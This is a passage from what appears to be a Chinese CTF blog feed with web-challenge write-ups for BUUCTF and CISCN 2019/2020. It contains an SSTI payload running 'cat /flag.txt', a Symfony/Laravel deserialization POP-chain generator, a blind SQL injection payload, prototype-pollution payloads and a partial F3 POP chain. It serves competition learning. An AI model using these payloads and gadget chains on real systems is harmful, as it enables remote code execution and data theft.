message <span class="token operator">=</span> <span class="token string">"{{{}.__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__.__import__('os').popen('cat /flag.txt').read()[::-1]}}"</span>    <span class="token comment" spellcheck="true"># 明文</span>
enc_base64 <span class="token operator">=</span> rc4_main<span class="token punctuation">(</span>key<span class="token punctuation">,</span> message<span class="token punctuation">)</span>
enc_init <span class="token operator">=</span> str<span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>enc_base64<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'utf-8'</span><span class="token punctuation">)</span>
enc_url <span class="token operator">=</span> parse<span class="token punctuation">.</span>quote<span class="token punctuation">(</span>enc_init<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"rc4加密后的url编码:"</span> <span class="token operator">+</span> enc_url<span class="token punctuation">)</span>
</code></pre>
<p>那个safe函数好像什么用也没有，只会输出xxx is not allowed，但是事实上该执行的命令还是会执行，buu上的环境问题flag的格式是flag{xxx}，所以最后那层的过滤就没有用了，不过想绕过也不难，分段读取或者翻转字符串什么的都可行</p>
<h2 id="小坑"><a href="#小坑" class="headerlink" title="小坑"></a>小坑</h2><p>真的算坑吗，学艺不精导致的智障操作，payload没有用双大括号括起来，渲染出来就是自己的payload，想了半天怎么回事。。。渲染起码先来一个双大括号吧</p>
]]></content>
      <categories>
        <category>刷题记录</category>
      </categories>
      <tags>
        <tag>ssti</tag>
      </tags>
  </entry>
  <entry>
    <title>[CISCN2019 总决赛 Day1 Web4]Laravel1</title>
    <url>/%5BCISCN2019%20%E6%80%BB%E5%86%B3%E8%B5%9B%20Day1%20Web4%5DLaravel1.html</url>
    <content><![CDATA[<h1 id="CISCN2019-总决赛-Day1-Web4-Laravel1"><a href="#CISCN2019-总决赛-Day1-Web4-Laravel1" class="headerlink" title="[CISCN2019 总决赛 Day1 Web4]Laravel1"></a>[CISCN2019 总决赛 Day1 Web4]Laravel1</h1><p>这叫一分题，这叫一分题，这叫一分题？<br>我做疯了，又是赵总经典反序列化超级挖掘</p>
<h2 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h2><p>源码意思就是反序列化一个GET的payload，这个框架大大大，namespace一大堆<br>搜一下__destruct，搜出来一万个，放弃挣扎，开始看wp</p>
<p>可以找到一个名叫TagAwareAdapter类的__destruct函数，里面有一系列调用</p>
<pre class=" language-php"><code class="language-php">    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">invalidateTags</span><span class="token punctuation">(</span><span class="token keyword">array</span> <span class="token variable">$tags</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token variable">$ok</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
        <span class="token variable">$tagsByKey</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token variable">$invalidatedTags</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$tags</span> <span class="token keyword">as</span> <span class="token variable">$tag</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            CacheItem<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">validateKey</span><span class="token punctuation">(</span><span class="token variable">$tag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token variable">$invalidatedTags</span><span class="token punctuation">[</span><span class="token variable">$tag</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">deferred</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token variable">$items</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">deferred</span><span class="token punctuation">;</span>
            <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$items</span> <span class="token keyword">as</span> <span class="token variable">$key</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$item</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">pool</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">saveDeferred</span><span class="token punctuation">(</span><span class="token variable">$item</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                    <span class="token function">unset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">deferred</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                    <span class="token variable">$ok</span> <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
                <span class="token punctuation">}</span>
            <span class="token punctuation">}</span>

            <span class="token variable">$f</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">getTagsByKey</span><span class="token punctuation">;</span>
            <span class="token variable">$tagsByKey</span> <span class="token operator">=</span> <span class="token variable">$f</span><span class="token punctuation">(</span><span class="token variable">$items</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">deferred</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token variable">$tagVersions</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">getTagVersions</span><span class="token punctuation">(</span><span class="token variable">$tagsByKey</span><span class="token punctuation">,</span> <span class="token variable">$invalidatedTags</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$f</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">createCacheItem</span><span class="token punctuation">;</span>

        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$tagsByKey</span> <span class="token keyword">as</span> <span class="token variable">$key</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$tags</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">pool</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">saveDeferred</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">(</span><span class="token keyword">static</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">TAGS_PREFIX</span><span class="token punctuation">.</span><span class="token variable">$key</span><span class="token punctuation">,</span> <span class="token function">array_intersect_key</span><span class="token punctuation">(</span><span class="token variable">$tagVersions</span><span class="token punctuation">,</span> <span class="token variable">$tags</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$items</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token variable">$ok</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">pool</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">commit</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$ok</span><span class="token punctuation">;</span>

        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$invalidatedTags</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token variable">$f</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">invalidateTags</span><span class="token punctuation">;</span>
            <span class="token variable">$ok</span> <span class="token operator">=</span> <span class="token variable">$f</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">tags</span><span class="token punctuation">,</span> <span class="token variable">$invalidatedTags</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$ok</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token keyword">return</span> <span class="token variable">$ok</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">commit</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">invalidateTags</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">commit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
</code></pre>
<p>一路调用到invalidateTags，这里面调用了一个pool对象的saveDeferred方法，看一下__construct</p>
<pre class=" language-php"><code class="language-php">    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span>AdapterInterface <span class="token variable">$itemsPool</span><span class="token punctuation">,</span> AdapterInterface <span class="token variable">$tagsPool</span> <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">,</span> float <span class="token variable">$knownTagVersionsTtl</span> <span class="token operator">=</span> <span class="token number">0.15</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">pool</span> <span class="token operator">=</span> <span class="token variable">$itemsPool</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">tags</span> <span class="token operator">=</span> <span class="token variable">$tagsPool</span> <span class="token operator">?</span><span class="token punctuation">:</span> <span class="token variable">$itemsPool</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">knownTagVersionsTtl</span> <span class="token operator">=</span> <span class="token variable">$knownTagVersionsTtl</span><span class="token punctuation">;</span>
        <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
    <span class="token punctuation">}</span>
</code></pre>
<p>里面规定了pool需要是AdapterInterface这个接口的，所以得找个实现AdapterInterface这个接口的类的saveDeferred方法<br>（接口给我的直观感受类似于多继承）</p>
<p>找到类PhpArrayAdapter，其方法调用initialize，跟进，有一个include</p>
<pre class=" language-php"><code class="language-php">    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">saveDeferred</span><span class="token punctuation">(</span>CacheItemInterface <span class="token variable">$item</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">null</span> <span class="token operator">===</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">values</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">initialize</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token keyword">return</span> <span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">keys</span><span class="token punctuation">[</span><span class="token variable">$item</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">getKey</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">pool</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">saveDeferred</span><span class="token punctuation">(</span><span class="token variable">$item</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function">initialize</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">keys</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">values</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

            <span class="token keyword">return</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token variable">$values</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">include</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file</span><span class="token punctuation">)</span> <span class="token operator">?</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token number">2</span> <span class="token operator">!==</span> \<span class="token package">count</span><span class="token punctuation">(</span><span class="token variable">$values</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$values</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$values</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">keys</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">values</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
            <span class="token function">list</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">keys</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">values</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token variable">$values</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
</code></pre>
<p>那么只要把flag include进来就好了，initialize还需要一个CacheItemInterface接口的参数，但是在利用过程中用不上，随便找一个类，构造如下payload</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token keyword">namespace</span> <span class="token package">Symfony<span class="token punctuation">\</span>Component<span class="token punctuation">\</span>Cache</span><span class="token punctuation">{</span>
    <span class="token keyword">final</span> <span class="token keyword">class</span> <span class="token class-name">CacheItem</span><span class="token punctuation">{</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">namespace</span> <span class="token package">Symfony<span class="token punctuation">\</span>Component<span class="token punctuation">\</span>Cache<span class="token punctuation">\</span>Adapter</span><span class="token punctuation">{</span>
    <span class="token keyword">use</span> <span class="token package">Symfony<span class="token punctuation">\</span>Component<span class="token punctuation">\</span>Cache<span class="token punctuation">\</span>CacheItem</span><span class="token punctuation">;</span>
    <span class="token keyword">class</span> <span class="token class-name">PhpArrayAdapter</span><span class="token punctuation">{</span>
        <span class="token keyword">private</span> <span class="token variable">$file</span><span class="token operator">=</span><span class="token string">'/flag'</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">class</span> <span class="token class-name">TagAwareAdapter</span><span class="token punctuation">{</span>
        <span class="token keyword">private</span> <span class="token variable">$deferred</span><span class="token punctuation">;</span>
        <span class="token keyword">private</span> <span class="token variable">$pool</span><span class="token punctuation">;</span>
        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">deferred</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">'z33'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token keyword">new</span> <span class="token class-name">CacheItem</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">pool</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PhpArrayAdapter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    <span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">TagAwareAdapter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token delimiter">?></span>
</code></pre>
<p>use和python的import as有点像，就是把Symfony\Component\Cache\CacheItem这么大一串可以只用最后的CacheItem来表示</p>
<p>我猜这个一分题大家真正实打实审出来的不多，大部分都是直接payload一把梭的吧。。。</p>
]]></content>
      <categories>
        <category>刷题记录</category>
      </categories>
      <tags>
        <tag>反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title>[CISCN2020决赛]web wp</title>
    <url>/%5BCISCN2020%5Dweb%20wp.html</url>
    <content><![CDATA[<h1 id="CISCN2020决赛-web-wp"><a href="#CISCN2020决赛-web-wp" class="headerlink" title="[CISCN2020决赛]web wp"></a>[CISCN2020决赛]web wp</h1><p>由于nb的易霖博，第一天awd崩了之后第二天变成了断网ctf，断网misc和断网密码学<br>嗯，失去了网络，战斗力变成0，三个半小时极限做题就做出来一个最傻逼的签到，剩下两个题看了一眼没试出来，菜逼的眼神<br>听师傅们讨论，瞬间会写，我太弱了</p>
<h2 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h2><p>SQL注入，语句为<br><code>SELECT * FROM fake_flag WHERE id = &#39;$id&#39; limit 0,$limit</code><br>超级过滤列表为</p>
<pre class=" language-php"><code class="language-php">    <span class="token variable">$common_blacklist</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"!"</span><span class="token punctuation">,</span> <span class="token string">"\""</span><span class="token punctuation">,</span> <span class="token string">"#"</span><span class="token punctuation">,</span> <span class="token string">"%"</span><span class="token punctuation">,</span> <span class="token string">"&amp;"</span><span class="token punctuation">,</span> <span class="token string">"'"</span><span class="token punctuation">,</span> <span class="token string">";"</span><span class="token punctuation">,</span> <span class="token string">"&lt;"</span><span class="token punctuation">,</span> <span class="token string">"="</span><span class="token punctuation">,</span> <span class="token string">">"</span><span class="token punctuation">,</span> <span class="token string">"\\"</span><span class="token punctuation">,</span> <span class="token string">"^"</span><span class="token punctuation">,</span> <span class="token string">"`"</span><span class="token punctuation">,</span> <span class="token string">"|"</span> <span class="token punctuation">,</span><span class="token string">'between'</span><span class="token punctuation">,</span><span class="token string">'not'</span><span class="token punctuation">,</span><span class="token string">" "</span><span class="token punctuation">,</span><span class="token string">"like"</span><span class="token punctuation">,</span><span class="token string">','</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$hack_list</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'union'</span><span class="token punctuation">,</span><span class="token string">'join'</span><span class="token punctuation">,</span><span class="token string">'in'</span><span class="token punctuation">,</span><span class="token string">"/**/"</span><span class="token punctuation">,</span><span class="token string">"substr"</span><span class="token punctuation">,</span><span class="token string">"ascii"</span><span class="token punctuation">,</span><span class="token string">"left"</span><span class="token punctuation">,</span><span class="token string">"right"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$id_blacklist</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'left'</span><span class="token punctuation">,</span><span class="token string">'right'</span><span class="token punctuation">,</span><span class="token string">'like'</span><span class="token punctuation">,</span><span class="token string">'('</span><span class="token punctuation">,</span><span class="token string">')'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$limit_blacklist</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'-'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
</code></pre>
<p>注入点是id和limit，id上有超级过滤，括号逗号union什么的，limit上没有，ban了&#x2F;**&#x2F;，但是没有单独ban&#x2F;*和*&#x2F;，一开始没发现，然后没有括号，id那里用不了select，就没法拿到另一张表的的flag，想盲注，&lt;&gt;&#x3D;like全部过滤，被暴打，放弃<br>最后看师傅们的payload，直接在id和limit处闭合注释为所欲为，用减法的结果进行盲注，mid截取字符串，from for绕过逗号<br>limit有一个需要数字范围在0-10，字符串弱类型比较，开头是个数字就行<br>本地实验payload，可行，还是得用括号单开一个新select才能拿到其他表的值<br><code>select * from users where id=0 or 69-/*aaaaa*/ord((select mid(group_concat(email_id) from 1 for 1) from emails));</code></p>
<h2 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h2><p>是y1ng神仙出的签到，难度不大不过感觉做的很精致，比我的垃圾前端强一万倍<br>JavaScript原型链污染，选英雄打boss，刀斯林狂喜<br>看到开了json的解析，可以提交奇怪的数据了，boss攻击力正无穷血也厚，玩家攻击力低，加道具也没输出，三回合必死，但是可以自己提交数据创建英雄。看到在选巫医的时候技能是加血而不是加攻，buff这个属性不会被赋值，通过原型链污染加buff把攻击力加到1000，一刀一个小朋友获得flag</p>
<p>content-type改为application&#x2F;json<br>提交一个{“__proto__“:{“buff”: 1000}，”xxx”: “xxx”……}选大药和巫医两个不加攻击力的属性，就能原型链污染一拳打死小强</p>
<h2 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h2><p>反序列化逃逸，完全看得出来是这么回事，就是没想出来是逃逸一个对象出来呜呜呜<br>有一个反序列化点，反序列化会check一下data，把flag，file之类的替换成index，看到这就应该想到是逃逸出来一个数据，而类在destruct的时候会把avatar的内容base64编码输出，但是反序列化出来的赋值变量并没有avatar，所以逃逸出了对象也不能控制avatar属性，太难了。<br>并且flag会被替换为index，也不能读取flag.php<br>难点upup<br>源码不贴了太多，打过的师傅自然懂怎么回事</p>
<p>然后师傅们直接逃逸出来一个User对象，根本不逃逸单独一个avatar，我直接构造出一个对象然后把它析构掉输出flag，太牛逼了<br>至于flag的绕过，则反序列化时使用大写S方法进行字符串逃逸，使用十六进制代替字符，读取flag</p>
]]></content>
      <categories>
        <category>刷题记录</category>
      </categories>
      <tags>
        <tag>wp</tag>
      </tags>
  </entry>
  <entry>
    <title>[CISCN2020 华东北赛区]web wp</title>
    <url>/%5BCISCN2020%20%E5%8D%8E%E4%B8%9C%E5%8C%97%E8%B5%9B%E5%8C%BA%5Dweb%20wp.html</url>
    <content><![CDATA[<h1 id="CISCN2020-华东北赛区-web-wp"><a href="#CISCN2020-华东北赛区-web-wp" class="headerlink" title="[CISCN2020 华东北赛区]web wp"></a>[CISCN2020 华东北赛区]web wp</h1><p>国赛结束写wp，输出很低，web都被神仙们日穿了，每个题都几百解，太牛逼了<br>没保留题目源码，就凑合着写吧</p>
<h2 id="easyphp"><a href="#easyphp" class="headerlink" title="easyphp"></a>easyphp</h2><p>用pntcl库开线程，子进程里面有命令执行，<code>call_user_func_array($_GET[&#39;a&#39;], array($_GET[&#39;b&#39;]), false, true);</code><br>父进程调用了pntcl_wait后调用pcntl_wifexited，子进程如果异常退出，父进程就会展示phpinfo，flag就在phpinfo里面，正则匹配$_GET[‘a’]不能有exec和pntcl之类的字段<br>使用call_user_func_array调用一个三个参数的函数，一开始fuzz能接受三个参数的函数fuzz了半天，最后意识到可以直接调用一个call_user_func，用call_user_func再去调用pntcl库的函数，不受正则影响，<br>师傅说子进程调用一个pntcl_wait就可以让父进程的pcntl_wifexited判断出问题，理论上感觉是子进程被挂起父进程wait结束发现子进程未正常退出吧？<br>在phpinfo中获取flag</p>
<h2 id="littlegame"><a href="#littlegame" class="headerlink" title="littlegame"></a>littlegame</h2><p>js原型链污染，给flag靠Admin[key] &#x3D;&#x3D;&#x3D; password，key和password均可控，污染掉object给admin加一个属性就可以了，Privilege路由下面可以添加属性，key，value均可控，使用set-value第三方库进行合并操作，原型链污染点，大概看了一下合并（没看太懂，感觉就是简单地赋值合并）用如下代码进行尝试，发现原型链被污染，同理打一个payload就能获取flag了</p>
<pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">let</span> k <span class="token operator">=</span> <span class="token string">"__proto__.aaa"</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">let</span> v <span class="token operator">=</span> <span class="token string">"111"</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">let</span> o <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"a"</span><span class="token punctuation">:</span><span class="token string">"a"</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
<span class="token function">setFn</span><span class="token punctuation">(</span>o<span class="token punctuation">,</span>k<span class="token punctuation">,</span>v<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">let</span> b <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>b<span class="token punctuation">[</span><span class="token string">"aaa"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">// 111</span>
</code></pre>
<h3 id="trick"><a href="#trick" class="headerlink" title="trick"></a>trick</h3><p>看了师傅们的wp之后发现原来在给了package.json的时候可以运行一下npm audit直接查找当前第三方库存在什么样的问题，js类的题经常出现第三方库的漏洞，运行一下得到如下输出</p>
<pre><code>$ npm audit

                       === npm audit security report ===

# Run  npm update set-value --depth 1  to resolve 1 vulnerability

  High            Prototype Pollution

  Package         set-value

  Dependency of   set-value

  Path            set-value

  More info       https://npmjs.com/advisories/1012

found 1 high severity vulnerability in 61 scanned packages
  run `npm audit fix` to fix 1 of them.
</code></pre>
<p>直接告诉了有原型链污染，太高级了</p>
<h2 id="babyunserialize"><a href="#babyunserialize" class="headerlink" title="babyunserialize"></a>babyunserialize</h2><p>WMCTF相同的框架，把WMCTF能查到的几个wp用到的pop链的函数都删了，自己写了一个可爱的正则去找$xxx-&gt;xxx($this-&gt;xxxx)的函数调用形式，在DB\Jig\Mapper里面找到了好几个类似函数，选一个update用，WS类是反序列化出来让autoload加载Agent类的，用Agent类的析构函数构造出pop链，array($MongoMapper,”update”)()这种形式的动态调用会调用MongoMapper类的update方法</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token keyword">namespace</span> <span class="token package">CLI</span><span class="token punctuation">{</span>
    <span class="token keyword">class</span> <span class="token class-name">Agent</span>
    <span class="token punctuation">{</span>
        <span class="token keyword">protected</span> <span class="token variable">$server</span><span class="token punctuation">;</span>
        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$server</span><span class="token punctuation">)</span>
        <span class="token punctuation">{</span>
            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">server</span><span class="token operator">=</span><span class="token variable">$server</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">class</span> <span class="token class-name">WS</span>
    <span class="token punctuation">{</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token keyword">namespace</span> <span class="token package">DB</span><span class="token punctuation">{</span>
    <span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name">Cursor</span>  <span class="token keyword">implements</span> <span class="token class-name"><span class="token punctuation">\</span>IteratorAggregate</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>
    <span class="token keyword">class</span> <span class="token class-name">Mongo</span> <span class="token punctuation">{</span>
        <span class="token keyword">public</span> <span class="token variable">$events</span><span class="token punctuation">;</span>
        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$events</span><span class="token punctuation">)</span>
        <span class="token punctuation">{</span>
            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">events</span><span class="token operator">=</span><span class="token variable">$events</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

